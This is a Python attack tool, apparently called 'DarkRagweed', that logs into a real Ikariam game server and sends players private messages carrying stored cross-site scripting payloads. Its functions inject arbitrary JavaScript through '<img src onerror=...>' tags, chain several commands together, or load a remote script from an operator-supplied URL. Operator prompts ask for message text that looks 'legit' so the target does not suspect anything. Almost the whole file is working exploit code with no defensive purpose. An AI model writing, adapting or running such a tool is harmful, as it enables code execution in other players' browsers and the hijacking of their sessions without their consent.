#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

import requests
import sys
import time
from bs4 import BeautifulSoup

# Login Details
EMAIL    = 'test@test.com'
PASSWORD = 'yourpassword'

# Set of base URLs to use, login, craft requests, etc
# A.k.a. the Browser game API endpoint
BASEURL_LOGIN_BACKEND = 'http://s39-es.ikariam.gameforge.com/index.php?action=loginAvatar&function=login'

# Response 200 returned by requests module
REP200 = "<Response [200]>"
def responsePrint(data):
    if str(data) is REP200:
        print("[>] 200")
    else:
        print(data)
    time.sleep(1)

def sendPrivMsg(oneclicktoken, session):
    #1. ask user for data
    print("Message content: ", end = '')
    content = str(input())
    print("Target ID:", end = '')
    recvID = str(input())

    #2. craft request
    msg_data = {
        'action': 'Messages',
        'function': 'send',
        'receiverId': recvID,
        'closeView': 1,
        'msgType': 50,
        'content': content,
        'isMission': 1,
        'allyId': 0,
        'backgroundView': 'island',
        'currentIslandId': 696, #well... heh xD static for now
        'templateView': 'sendIKMessage',
        'actionRequest': oneclicktoken,
        'ajax': 1,
    }


    #3. send request
    phpURL = "http://s39-es.ikariam.gameforge.com/index.php"
    r = session.post(phpURL, data=msg_data)

    responsePrint(r)

def sendPrivMsgAndJSCommand(oneclicktoken, session):
    #1. ask user for data
    print("Message content (try to make it legit): ", end = '')
    content = str(input())
    print("   NOTE: You can chain more than 1 command using eval() like:")
    print("EXAMPLE: eval(\" alert(1); alert('hello there') \")\n\n")
    print("[D]Command to be executed: ", end = '')
    command = str(input())


    payload = "<img src onerror="+command+">"
    #print(payload)
    print("Target ID:", end = '')
    recvID = str(input())

    content = content+" "+payload

    #2. craft request
    msg_data = {
        'action': 'Messages',
        'function': 'send',
        'receiverId': recvID,
        'closeView': 1,
        'msgType': 50,
        'content': content,
        'isMission': 1,
        'allyId': 0,
        'backgroundView': 'island',
        'currentIslandId': 696, #well... heh xD static for now
        'templateView': 'sendIKMessage',
        'actionRequest': oneclicktoken,
        'ajax': 1,
    }


    #3. send request
    phpURL = "http://s39-es.ikariam.gameforge.com/index.php"
    r = session.post(phpURL, data=msg_data)
    responsePrint(r)

def sendPrivMsgAndJSRemote(oneclicktoken, session):
    #1. ask user for data
    print("Message content (try to make it legit): ", end = '')
    content = str(input())
    print("Script URL to be executed: ", end = '')
    url = str(input())

    command = "d=document;b=d.createElement('script');d.body.appendChild(b);b.src=" + str(url) + ';'

    payload = content+" "+"<img src onerror="+command+">"
    #print(payload)
    
    print("Target ID:", end = '')
    recvID = str(input())

    content = payload #content + payload

    #2. craft request
    msg_data = {
        'action': 'Messages',
        'function': 'send',
        'receiverId': recvID,
        'closeView': 1,
        'msgType': 50,
        'content': content,
        'isMission': 1,
        'allyId': 0,
        'backgroundView': 'island',
        'currentIslandId': 696, #well... heh xD static for now
        'templateView': 'sendIKMessage',
        'actionRequest': oneclicktoken,
        'ajax': 1,
    }


    #3. send request
    phpURL = "http://s39-es.ikariam.gameforge.com/index.php"
    r = session.post(phpURL, data=msg_data)
    responsePrint(r)


def sendPrivMsgAndCommandChain1(oneclicktoken, session):
    #1. ask user for data
    print("Message content (try to make it legit): ", end = '')
    content = str(input())

    entrada = ""
    comand = ""
    cont = True

    print("[>] Enter commands to be executed. Ctrl+C to stop.")
    print("[X] DO NOT INCLUDE WHITESPACES. USE SINGLE QUOTES.")
    while(cont):
        try:
            print("> ", end = '')
            entrada = str(input())
            comand = comand + entrada + ';'
        except KeyboardInterrupt:
            cont = False


    payload = content+"<img src onerror="+str(comand)+">"
    #print("\n"+payload)

    print("Target ID:", end = '')
    recvID = str(input())
    
    #2. craft request
    msg_data = {
        'action': 'Messages',
        'function': 'send',
        'receiverId': recvID,
        'closeView': 1,
        'msgType': 50,
        'content': payload,
        'isMission': 1,
        'allyId': 0,
        'backgroundView': 'island',
        'currentIslandId': 696, #well... heh xD static for now
        'templateView': 'sendIKMessage',
        'actionRequest': oneclicktoken,
        'ajax': 1,
    }


    #3. send request
    phpURL = "http://s39-es.ikariam.gameforge.com/index.php"
    r = session.post(phpURL, data=msg_data)
    responsePrint(r)


#TODO
#uses a single <img tag for each command
def sendPrivMsgAndCommandChain2(oneclicktoken, session):
    print("TODO")


def main():
    logo = """ 
  _____             _    _____                                   _ 
 |  __ \           | |  |  __ \                                 | |
 | |  | | __ _ _ __| | _| |__) |__ _  __ ___      _____  ___  __| |
 | |  | |/ _` | '__| |/ /  _  // _` |/ _` \ \ /\ / / _ \/ _ \/ _` |
 | |__| | (_| | |  |   <| | \ \ (_| | (_| |\ V  V /  __/  __/ (_| |
 |_____/ \__,_|_|  |_|\_\_|  \_\__,_|\__, | \_/\_/ \___|\___|\__,_|
                                      __/ |                        
                                     |___/                         
     """
    print(logo)
    print("[>] DarkRagweed, the Ikariam Hacking Framework.\n")

    if EMAIL == 'test@test.com':
        print("[!] Default credentials detected. Exiting..")
        exit(1)

    # Start a session so we can have persistant cookies
    session = requests.session()

    print("[>] Crafting request...")

    # This is the form data that the page sends when logging in
    login_data = {
        'uni-url': 's39-es.ikariam.gameforge.com',
        'name': EMAIL,
        'password': PASSWORD,
        'pwat_uid': '',
        'pwat_checksum': '',
        'startPageShown': 1,
        'detectedDevice': 1,
        'kid': '',
        'autoLogin': 'on',
    }

    print("[>] Login in...")

    # Authenticate
    r = session.post(BASEURL_LOGIN_BACKEND, data=login_data)

    responsePrint(r)

    #filename = "loggedIkariam.html"
    #file = open(filename, "wb")
    #file.write(bytes(r.text, 'utf-8'))
    #file.close()

    print("[>] Obtaining one-click token...")
    page       = BeautifulSoup(r.content, "html.parser")
    hiddenVal  = page.find("input", {"name": "actionRequest"})
    clickToken = hiddenVal['value']
    print("[>] "+clickToken)

    #THIS WILL RAISE AN ERROR IF THE LOGIN FIALS (IE: WRONG CREDENTIALS)
    #Here's a good place for error catching
    #print("> hidden value1: ")
    #print(hiddenVal1['value'])

    #print("> hidden value2: ")
    #print(hiddenVal2['value'])



    print("\n[X] Framework Initiated Correctly. Session Obtained\n")


    option = -1
    while(option!=0):
        print("(1) Send Private Message")
        print("(2) Send Private Message + JS Command       (PC and App)")
        print("(3) Send Private Message + JS Command chain (1)(PC and App)")
        print("(4) Send Private Message + JS Command chain (2)(PC and App)")
        print("(5) Send Private Message + JS Remote Script (PC)")
        print("(0) Log Out\n> ", end = '')
        option = int(input())
        if(option==1):
            sendPrivMsg(clickToken, session)
        elif(option==2):
            sendPrivMsgAndJSCommand(clickToken, session)
        elif(option==3):
            sendPrivMsgAndCommandChain1(clickToken, session)
        elif(option==4):
            sendPrivMsgAndCommandChain2(clickToken, session)
        elif(option==5):
            sendPrivMsgAndJSRemote(clickToken, session)
        else:
            #close session
            exit()
        
        #after an action, read the new one click value
        page       = BeautifulSoup(r.content, "html.parser")
        hiddenVal  = page.find("input", {"name": "actionRequest"})
        clickToken = hiddenVal['value']


if __name__ == '__main__':
    main()
